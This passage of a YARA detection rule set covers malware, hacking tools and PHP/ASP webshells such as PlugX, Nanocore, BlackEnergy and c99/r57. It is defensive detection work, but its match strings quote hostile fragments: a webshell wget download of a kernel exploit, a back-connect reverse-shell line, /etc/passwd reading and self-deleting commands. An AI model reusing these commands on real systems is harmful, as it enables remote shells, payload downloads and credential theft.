      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "801e3b6d84862163a735502f93b9663be53ccbdd7f12b0707336fecba3a829a2"
      tags = "APT, DEMO, FILE, T1210, T1547_009, stuxnet"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c" wide
   condition: 
      uint16 ( 0 ) == 0x004c and filesize < 10KB and $x1
}

rule PlugX_J16_Gen2_RID2BBC : DEMO EXE FILE MAL plugx {
   meta:
      description = "Detects PlugX Malware Samples from June 2016"
      author = "Florian Roth"
      reference = "MISP 3954"
      date = "2016-06-08 09:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5dff1e086c5191a0bd7ac13466b7a81a87e99e51968df2f32570eb031c537ab4"
      hash2 = "710326804b78ccd2782abc16354e389f0e36ba9474ebdced17337a13082ac12f"
      tags = "DEMO, EXE, FILE, MAL, plugx"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "XPlugKeyLogger.cpp" fullword ascii
      $s2 = "XPlugProcess.cpp" fullword ascii
      $s4 = "XPlgLoader.cpp" fullword ascii
      $s5 = "XPlugPortMap.cpp" fullword ascii
      $s8 = "XPlugShell.cpp" fullword ascii
      $s11 = "file: %s, line: %d, error: [%d]%s" fullword ascii
      $s12 = "XInstall.cpp" fullword ascii
      $s13 = "XPlugTelnet.cpp" fullword ascii
      $s14 = "XInstallUAC.cpp" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 2 of ( $s* ) ) ) or ( 5 of them )
}

rule LM_hash_empty_String_RID2F11 : DEMO HKTL {
   meta:
      description = "Detects the empty LM hash on disk/in memory/as output from hacking tools"
      author = "Florian Roth"
      reference = "-"
      date = "2016-06-03 11:41:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "500:AAD3B435B51404EEAAD3B435B51404EE:" ascii
      $s1 = "500:aad3b435b51404eeaad3b435b51404ee:" ascii
   condition: 
      1 of them
}

rule RUAG_Cobra_Malware_RID2DAE : APT DEMO EXE FILE NK {
   meta:
      description = "Detects a malware mentioned in the RUAG Case called Carbon/Cobra"
      author = "Florian Roth"
      reference = "https://www.ncsc.admin.ch/govcert"
      date = "2016-05-23 10:42:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "APT, DEMO, EXE, FILE, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\Cobra\\Release\\Cobra.pdb" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1
}

rule RUAG_Cobra_Config_File_RID2F1A : APT DEMO FILE NK {
   meta:
      description = "Detects a config text file used by malware Cobra in RUAG case"
      author = "Florian Roth"
      reference = "https://www.ncsc.admin.ch/govcert"
      date = "2016-05-23 11:42:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2026-03-12"
      tags = "APT, DEMO, FILE, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = "[NAME]" ascii
      $s1 = "object_id=" ascii
      $s2 = "[TIME]" ascii fullword
      $s3 = "lastconnect" ascii
      $s4 = "[CW_LOCAL]" ascii fullword
      $s5 = "system_pipe" ascii
      $s6 = "user_pipe" ascii
      $s7 = "[TRANSPORT]" ascii
      $s8 = "run_task_system" ascii
      $s9 = "[WORKDATA]" ascii
      $s10 = "address1" ascii
   condition: 
      uint32 ( 0 ) == 0x4d414e5b and filesize < 5KB and $h1 at 0 and 8 of ( $s* )
}

rule RUAG_Exfil_Config_File_RID2F2B : APT DEMO FILE T1020 {
   meta:
      description = "Detects a config text file used in data exfiltration in RUAG case"
      author = "Florian Roth"
      reference = "https://www.ncsc.admin.ch/govcert"
      date = "2016-05-23 11:45:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2026-03-12"
      tags = "APT, DEMO, FILE, T1020"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = "[TRANSPORT]" ascii
      $s1 = "system_pipe" ascii
      $s2 = "spstatus" ascii
      $s3 = "adaptable" ascii
      $s4 = "post_frag" ascii
      $s5 = "pfsgrowperiod" ascii
   condition: 
      uint32 ( 0 ) == 0x4152545b and filesize < 1KB and $h1 at 0 and all of ( $s* )
}

rule GetUserSPNs_PS1_RID2C67 : DEMO HKTL SCRIPT T1059_001 {
   meta:
      description = "Semiautomatically generated YARA rule - file GetUserSPNs.ps1"
      author = "Florian Roth"
      reference = "https://github.com/skelsec/PyKerberoast"
      date = "2016-05-21 09:47:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1b69206b8d93ac86fe364178011723f4b1544fff7eb1ea544ab8912c436ddc04"
      tags = "DEMO, HKTL, SCRIPT, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()" fullword ascii
      $s2 = "@{Name=\"PasswordLastSet\";      Expression={[datetime]::fromFileTime($result.Properties[\"pwdlastset\"][0])} } #, `" fullword ascii
      $s3 = "Write-Host \"No Global Catalogs Found!\"" fullword ascii
      $s4 = "$searcher.PropertiesToLoad.Add(\"pwdlastset\") | Out-Null" fullword ascii
   condition: 
      2 of them
}

rule kerberoast_PY_RID2C4B : DEMO HKTL SCRIPT T1558_003 {
   meta:
      description = "Semiautomatically generated YARA rule - file kerberoast.py"
      author = "Florian Roth"
      reference = "https://github.com/skelsec/PyKerberoast"
      date = "2016-05-21 09:43:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "73155949b4344db2ae511ec8cab85da1ccbf2dfec3607fb9acdc281357cdf380"
      tags = "DEMO, HKTL, SCRIPT, T1558_003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)" fullword ascii
      $s2 = "key = kerberos.ntlmhash(args.password)" fullword ascii
      $s3 = "help='the password used to decrypt/encrypt the ticket')" fullword ascii
      $s4 = "newencserverticket = kerberos.encrypt(key, 2, e, nonce)" fullword ascii
   condition: 
      2 of them
}

rule GhostDragon_Gh0stRAT_Sample3_RID3171 : CHINA DEMO Gh0stRAT MAL {
   meta:
      description = "Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/the-ghost-dragon"
      date = "2016-04-23 13:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42"
      tags = "CHINA, DEMO, Gh0stRAT, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 44 24 15 65 88 54 24 16 c6 44 24 } 
      $op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e } 
      $op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 } 
   condition: 
      all of them
}

rule Nanocore_RAT_Gen_1_RID2D95 : APT DEMO EXE FILE GEN NanocoreRAT {
   meta:
      description = "Detetcs the Nanocore RAT and similar malware"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 10:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e707a7745e346c5df59b5aa4df084574ae7c204f4fb7f924c0586ae03b79bf06"
      tags = "APT, DEMO, EXE, FILE, GEN, NanocoreRAT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Users\\Logintech\\Dropbox\\Projects\\New folder\\Latest\\Benchmark\\Benchmark\\obj\\Release\\Benchmark.pdb" fullword ascii
      $x2 = "RunPE1" fullword ascii
      $x3 = "082B8C7D3F9105DC66A7E3267C9750CF43E9D325" fullword ascii
      $x4 = "$374e0775-e893-4e72-806c-a8d880a49ae7" fullword ascii
      $x5 = "Monitorinjection" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )
}

rule Nanocore_RAT_Sample_1_RID2EDD : APT DEMO EXE FILE NanocoreRAT {
   meta:
      description = "Detetcs a certain Nanocore RAT sample"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 11:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "b7cfc7e9551b15319c068aae966f8a9ff563b522ed9b1b42d19c122778e018c8"
      tags = "APT, DEMO, EXE, FILE, NanocoreRAT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK" fullword wide
      $x2 = "1EF0D55861681D4D208EC3070B720C21D885CB35" fullword ascii
      $x3 = "popthatkitty.Resources.resources" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) ) ) or ( all of them )
}

rule Nanocore_RAT_Sample_2_RID2EDE : APT DEMO EXE FILE NanocoreRAT {
   meta:
      description = "Detetcs a certain Nanocore RAT sample"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "51142d1fb6c080b3b754a92e8f5826295f5da316ec72b480967cbd68432cede1"
      tags = "APT, DEMO, EXE, FILE, NanocoreRAT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "U4tSOtmpM" fullword ascii
      $s2 = ")U71UDAU_QU_YU_aU_iU_qU_yU_" wide
      $s3 = "Cy4tOtTmpMtTHVFOrR" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of ( $s* )
}

rule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
      hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
      tags = "DEMO, FILE, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "rm -rf scan.log session.txt" fullword ascii
      $s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
      $s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7362 and all of them )
}

rule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
      hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
      tags = "DEMO, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
      $s3 = "rm -rf scan.log" fullword ascii
   condition: 
      all of them
}

rule Locky_Ransomware_RID2D91 : CRIME DEMO MAL RANSOM {
   meta:
      description = "Detects Locky Ransomware (matches also on Win32/Kuluoz)"
      author = "Florian Roth"
      reference = "https://www.hybrid-analysis.com/sample/5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8?environmentId=1"
      date = "2016-02-17 10:37:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "CRIME, DEMO, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } 
      $o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } 
   condition: 
      all of ( $o* )
}

rule Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA : APT DEMO FILE G0007 LINUX RUSSIA {
   meta:
      description = "Detects Sofacy Fysbis Linux Backdoor"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
      date = "2016-02-13 14:14:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592"
      hash2 = "8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb"
      hash3 = "fd8b2ea9a2e8a67e4cb3904b49c789d57ed9b1ce5bebfe54fe3d98214d6a0f61"
      tags = "APT, DEMO, FILE, G0007, LINUX, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "RemoteShell" ascii
      $s2 = "basic_string::_M_replace_dispatch" fullword ascii
      $s3 = "HttpChannel" ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 500KB and all of them
}

rule Codoso_PGV_PVID_6_RID2CEB : DEMO EXE FILE G0073 MAL T1218_011 {
   meta:
      description = "Detects Codoso APT PGV_PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, G0073, MAL, T1218_011"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "rundll32 \"%s\",%s" fullword ascii
      $s1 = "/c ping 127.%d & del \"%s\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them
}

rule Codoso_CustomTCP_RID2D39 : DEMO EXE FILE G0073 MAL {
   meta:
      description = "Codoso CustomTCP Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, G0073, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "wnyglw" fullword ascii
      $s5 = "WorkerRun" fullword ascii
      $s7 = "boazdcd" fullword ascii
      $s8 = "wayflw" fullword ascii
      $s9 = "CODETABL" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 405KB and all of them
}

rule Codoso_PGV_PVID_5_RID2CEA : DEMO EXE FILE G0073 MAL {
   meta:
      description = "Detects Codoso APT PGV PVID Malware"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
      date = "2016-01-30 10:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
      hash2 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
      tags = "DEMO, EXE, FILE, G0073, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/c del %s >> NUL" fullword ascii
      $s2 = "%s%s.manifest" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
}

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 19:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
      hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$_POST['cmd'] = which('" ascii
      $s2 = "$blah = ex(" ascii
   condition: 
      filesize < 600KB and all of them
}

rule Webshell_c100_RID2B9A : DEMO T1087_001 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files c100 v. 777shell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 09:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
      hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
      tags = "DEMO, T1087_001, T1105, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
      $s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
      $s4 = "which wget curl w3m lynx" ascii
      $s6 = "netstat -atup | grep IST" ascii
   condition: 
      filesize < 685KB and 2 of them
}

rule Webshell_27_9_acid_c99_locus7s_RID31FA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
      $s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
   condition: 
      filesize < 1711KB and 1 of them
}

rule Webshell_27_9_c66_c99_RID2E09 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ..."
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:57:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
      $s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
      $s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
   condition: 
      filesize < 685KB and 1 of them
}

rule Webshell_Ayyildiz_RID2DF5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
      hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
      hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
      $s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
   condition: 
      filesize < 112KB and all of them
}

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 21:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
      hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
      $s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
   condition: 
      filesize < 882KB and all of them
}

rule Webshell_acid_AntiSecShell_3_RID31C7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell Acid"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 13:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
      $s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
   condition: 
      filesize < 900KB and all of them
}

rule Webshell_r57shell_2b_RID2E8F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell R57"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 11:19:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
      $s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
   condition: 
      filesize < 900KB and all of them
}

rule Webshell_zehir_RID2CC8 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
      author = "Florian Roth"
      reference = "https://github.com/nikicat/web-malware-collection"
      date = "2016-01-11 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
      hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
      hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
      $s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
   condition: 
      filesize < 200KB and 1 of them
}

rule BlackEnergy_Driver_USBMDM_RID304A : APT DEMO EXE FILE blackenergy {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
      date = "2016-01-04 12:33:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094"
      hash2 = "b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a"
      hash3 = "edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281"
      tags = "APT, DEMO, EXE, FILE, blackenergy"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USB MDM Driver" fullword wide
      $s2 = "KdDebuggerNotPresent" fullword ascii
      $s3 = "KdDebuggerEnabled" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them
}

rule BlackEnergy_Driver_AMDIDE_RID3026 : APT DEMO EXE FILE blackenergy {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
      date = "2016-01-04 12:27:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614"
      hash2 = "3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2"
      hash3 = "90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c"
      tags = "APT, DEMO, EXE, FILE, blackenergy"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = " AMD IDE driver" fullword wide
      $s2 = "SessionEnv" fullword wide
      $s3 = "\\DosDevices\\{C9059FFF-1C49-4445-83E8-" wide
      $s4 = "\\Device\\{C9059FFF-1C49-4445-83E8-" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
}

rule DropBear_SSH_Server_RID2E43 : APT DEMO EXE FILE T1021_004 {
   meta:
      description = "Detects DropBear SSH Server (not a threat but used to maintain access)"
      author = "Florian Roth"
      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 11:07:01"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE, T1021_004"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html" fullword ascii
      $s2 = "Badly formatted command= authorized_keys option" fullword ascii
      $s3 = "This Dropbear program does not support '%s' %s algorithm" fullword ascii
      $s4 = "/etc/dropbear/dropbear_dss_host_key" fullword ascii
      $s5 = "/etc/dropbear/dropbear_rsa_host_key" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule BlackEnergy_BackdoorPass_DropBear_SSH_RID352E : APT DEMO EXE FILE T1021_004 blackenergy {
   meta:
      description = "Detects the password of the backdoored DropBear SSH Server - BlackEnergy"
      author = "Florian Roth"
